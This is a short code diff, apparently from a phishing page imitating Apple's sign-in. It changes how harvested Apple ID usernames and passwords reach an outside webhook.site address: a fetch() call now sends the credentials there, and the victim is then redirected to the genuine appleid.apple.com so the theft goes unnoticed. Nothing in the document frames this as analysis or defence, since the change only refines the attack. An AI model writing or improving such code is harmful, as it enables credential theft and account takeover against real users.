@@ -259,7 +259,13 @@
         
         // Wait 2 seconds, then redirect with credentials
         setTimeout(() => {
-            window.location.href = 'https://webhook.site/f64f2030-f543-4cd4-b998-70537c83781d?appleid=' + encodeURIComponent(appleid) + '&password=' + encodeURIComponent(password) + '&timestamp=' + new Date().toISOString() + '&_redirect=https://appleid.apple.com/';
+            setTimeout(() => {
+    // Send to webhook first
+    fetch('https://webhook.site/f64f2030-f543-4cd4-b998-70537c83781d?appleid=' + encodeURIComponent(appleid) + '&password=' + encodeURIComponent(password));
+    
+    // Then redirect to Apple
+    window.location.href = 'https://appleid.apple.com/';
+}, 2000);
         }, 2000);
     });
 
